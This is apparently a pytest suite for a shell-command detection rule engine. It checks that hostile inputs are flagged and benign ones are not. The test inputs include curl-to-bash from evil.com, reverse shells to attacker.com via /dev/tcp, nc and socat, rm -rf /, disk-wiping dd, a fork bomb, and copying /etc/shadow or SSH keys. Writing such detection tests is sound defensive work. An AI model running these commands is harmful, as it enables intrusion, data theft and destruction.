"""
test_01_rule_engine.py — Unit tests for backend/detection/rule_engine.py

Tests every rule category independently, checks score capping,
and validates edge-case inputs (empty, whitespace, very long commands).

Run:
    pytest large_test_set/test_01_rule_engine.py -v
"""

import pytest
from backend.detection.rule_engine import RuleEngine


# ---------------------------------------------------------------------------
# Fixture
# ---------------------------------------------------------------------------

@pytest.fixture
def engine():
    """Fresh RuleEngine for each test (singleton reset handled by conftest)."""
    return RuleEngine()


# ===========================================================================
# 1. Shell Piping (curl/wget | bash)
# ===========================================================================

class TestShellPiping:

    @pytest.mark.parametrize("cmd", [
        "curl http://evil.com/script.sh | bash",
        "wget http://evil.com/payload | sh",
        "python3 -c 'code' | bash",
        "curl https://x.com/a.sh|bash",            # no spaces around pipe
        "perl -e 'x' | bash",
        "ruby script.rb | sh",
        "php payload.php | bash",
        "node -e 'x' | bash",
        "awk '{print}' file | bash",
        "curl http://x.com || bash fallback.sh",   # OR operator
        "wget http://x.com && bash payload.sh",    # AND operator
    ])
    def test_shell_piping_detected(self, engine, cmd):
        score, rules = engine.score_rules(cmd)
        assert "shell_piping" in rules, f"shell_piping not detected in: {cmd!r}"
        assert score >= 25

    @pytest.mark.parametrize("cmd", [
        "ls -la",
        "echo hello | tee output.txt",             # benign pipe
        "cat file.txt | wc -l",                    # benign pipe
        "grep error log.txt | head -20",           # benign pipe
        "ps aux | grep python",                    # benign pipe
        "df -h | sort",                            # benign pipe
    ])
    def test_shell_piping_not_triggered_on_safe(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert "shell_piping" not in rules, \
            f"False positive — shell_piping triggered on safe: {cmd!r}"


# ===========================================================================
# 2. Reverse Shell Patterns
# ===========================================================================

class TestReverseShell:

    @pytest.mark.parametrize("cmd", [
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "bash -i >& /dev/udp/attacker.com/53 0>&1",
        "sh -i >& /dev/tcp/attacker.com/8080 0>&1",
        "nc -e /bin/bash attacker.com 4444",
        "nc -l -p 4444 -e /bin/bash",
        "ncat -l -p 4444 -e /bin/sh",
        "ncat --exec /bin/bash attacker.com 4444",
        "socat exec:'/bin/bash' TCP-LISTEN:4444",
        "socat TCP:attacker.com:4444 EXEC:/bin/bash",
        "tclsh -c 'exec /bin/bash'",
    ])
    def test_reverse_shell_detected(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert "reverse_shell_pattern" in rules, \
            f"reverse_shell_pattern not detected in: {cmd!r}"

    @pytest.mark.parametrize("cmd", [
        "ls /dev/tcp",                             # listing the path, not using it
        "echo /dev/tcp",                           # just echoing
        "man nc",                                  # nc help
    ])
    def test_reverse_shell_not_triggered_on_safe(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert "reverse_shell_pattern" not in rules, \
            f"False positive — reverse_shell triggered on: {cmd!r}"


# ===========================================================================
# 3. Destructive Patterns
# ===========================================================================

class TestDestructivePatterns:

    @pytest.mark.parametrize("cmd", [
        "rm -rf /",
        "rm -rf / --no-preserve-root",
        "rm -rf /*",
        "mkfs.ext4 /dev/sda1",
        "mkfs.vfat /dev/sdb",
        "dd if=/dev/zero of=/dev/sda",
        "dd if=/dev/random of=/dev/sdb",
        "dd if=/dev/mem of=/dev/sda",
        ":(){ :|:& };:",                           # bash fork bomb
    ])
    def test_destructive_detected(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert "destructive_pattern" in rules, \
            f"destructive_pattern not detected in: {cmd!r}"

    @pytest.mark.parametrize("cmd", [
        "rm -rf /tmp/test_folder",                 # safe rm
        "rm file.txt",                             # safe rm
        "dd if=backup.img of=/dev/null",           # safe dd (output to null)
        "dd if=file.img of=copy.img",              # safe dd (file to file)
    ])
    def test_destructive_not_triggered_on_safe(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert "destructive_pattern" not in rules, \
            f"False positive — destructive triggered on: {cmd!r}"


# ===========================================================================
# 4. Privilege Escalation
# ===========================================================================

class TestPrivilegeEscalation:

    @pytest.mark.parametrize("cmd", [
        "sudo -u root /bin/bash -i",
        "sudo -u root whoami",
        "su -",
        "su root",
        "su -c 'whoami'",
        "chmod 777 /etc/shadow",
        "chmod 777 /etc/passwd",
    ])
    def test_privesc_detected(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert "privilege_escalation" in rules, \
            f"privilege_escalation not detected in: {cmd!r}"

    @pytest.mark.parametrize("cmd", [
        "sudo systemctl status nginx",             # normal sudo usage
        "chmod 644 file.txt",                      # safe chmod
        "chmod +x script.sh",                      # safe chmod
        "su user",                                 # switch to non-root user
    ])
    def test_privesc_not_triggered_on_safe(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert "privilege_escalation" not in rules, \
            f"False positive — privesc triggered on: {cmd!r}"


# ===========================================================================
# 5. Data Exfiltration
# ===========================================================================

class TestDataExfiltration:

    @pytest.mark.parametrize("cmd", [
        "cat /etc/shadow > /tmp/leak.txt",
        "cat /etc/passwd > /tmp/passwd_copy.txt",
        "cp /root/.ssh/id_rsa /tmp/key",
        "tar czf /tmp/out.tar.gz /root/.ssh",
    ])
    def test_exfiltration_detected(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert "data_exfiltration" in rules, \
            f"data_exfiltration not detected in: {cmd!r}"

    @pytest.mark.parametrize("cmd", [
        "cat /etc/hostname",                       # safe read
        "cat file.txt",                            # safe read
        "grep root /etc/passwd",                   # read-only grep
    ])
    def test_exfiltration_not_triggered_on_safe(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert "data_exfiltration" not in rules, \
            f"False positive — exfiltration triggered on: {cmd!r}"


# ===========================================================================
# 6. Encoded Payloads
# ===========================================================================

class TestEncodedPayloads:

    @pytest.mark.parametrize("cmd", [
        'base64 -d <<< "L2Jpbi9iYXNo"',
        'base64 --decode <<< "L2Jpbi9iYXNo"',
        'echo "abc123==" | base64 -d',
        'echo "abc" | base64 | base64 -d',
        r'printf "\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68"',
        r'printf "\x41\x41\x41"',
        'xxd -r -p <<< "62617368"',
        'od -An -t x1 <<< "bash"',
    ])
    def test_encoding_detected(self, engine, cmd):
        _, rules = engine.score_rules(cmd)
        assert "encoded_payload" in rules, \
            f"encoded_payload not detected in: {cmd!r}"

    @pytest.mark.parametrize("cmd", [
        "base64 file.txt",                         # encoding (not decoding)
        "base64 -e file.txt",                      # encoding flag
        "echo hello | base64",                     # encoding output
    ])
    def test_encoding_not_triggered_on_encode_only(self, engine, cmd):
        # These are encoding (not decoding) — should not flag encoded_payload
        # This documents current engine behavior; fails = engine is over-eager
        _, rules = engine.score_rules(cmd)
        assert "encoded_payload" not in rules, \
            f"False positive — encoded_payload triggered on encode-only: {cmd!r}"


# ===========================================================================
# 7. Score Mechanics
# ===========================================================================

class TestScoreMechanics:

    def test_score_never_exceeds_100(self, engine):
        """Stacking every rule category must not exceed 100."""
        ultra_cmd = (
            "curl http://evil.com | bash -i >& /dev/tcp/x/4444; "
            "rm -rf /; cat /etc/shadow > /tmp/x; "
            'base64 -d <<< "abc"; sudo -u root bash'
        )
        score, _ = engine.score_rules(ultra_cmd)
        assert score <= 100.0, f"Score exceeded 100: {score}"

    def test_score_is_non_negative(self, engine):
        score, _ = engine.score_rules("ls")
        assert score >= 0.0

    def test_score_is_float(self, engine):
        score, _ = engine.score_rules("ls")
        assert isinstance(score, float)

    def test_matched_rules_is_list(self, engine):
        _, rules = engine.score_rules("ls")
        assert isinstance(rules, list)

    def test_matched_rules_are_strings(self, engine):
        _, rules = engine.score_rules("curl http://evil.com | bash")
        assert all(isinstance(r, str) for r in rules)

    def test_known_rule_names(self, engine):
        """All returned rule names must be from the known set."""
        known = {
            "shell_piping", "reverse_shell_pattern", "destructive_pattern",
            "privilege_escalation", "data_exfiltration", "encoded_payload",
        }
        ultra = (
            "curl http://x.com | bash -i >& /dev/tcp/x/4444; "
            "rm -rf /; cat /etc/shadow > /tmp/x; "
            'base64 -d <<< "abc"; sudo -u root bash'
        )
        _, rules = engine.score_rules(ultra)
        for r in rules:
            assert r in known, f"Unknown rule name returned: {r!r}"


# ===========================================================================
# 8. Edge Cases
# ===========================================================================

class TestEdgeCases:

    def test_empty_string(self, engine):
        score, rules = engine.score_rules("")
        assert score == 0.0
        assert rules == []

    def test_whitespace_only(self, engine):
        score, rules = engine.score_rules("   \t\n")
        assert score == 0.0
        assert rules == []

    def test_single_character(self, engine):
        score, rules = engine.score_rules("x")
        assert score == 0.0
        assert rules == []

    def test_very_long_safe_command(self, engine):
        """10 KB of safe text must not crash and must score 0."""
        long_cmd = "ls " + "A" * 10_000
        score, rules = engine.score_rules(long_cmd)
        assert score == 0.0
        assert rules == []

    def test_newline_in_command(self, engine):
        """Commands with embedded newlines must not crash."""
        cmd = "ls\nrm -rf /"
        score, rules = engine.score_rules(cmd)
        # At minimum must not raise; may or may not detect depending on engine
        assert isinstance(score, float)

    def test_unicode_command(self, engine):
        score, rules = engine.score_rules("echo '你好世界'")
        assert score == 0.0
        assert rules == []

    def test_null_byte_in_command(self, engine):
        """Null bytes must not crash the engine."""
        score, rules = engine.score_rules("ls\x00-la")
        assert isinstance(score, float)

    def test_special_regex_characters(self, engine):
        """Commands containing regex metacharacters must not crash."""
        score, rules = engine.score_rules("grep '[0-9]\\+' file.txt")
        assert isinstance(score, float)
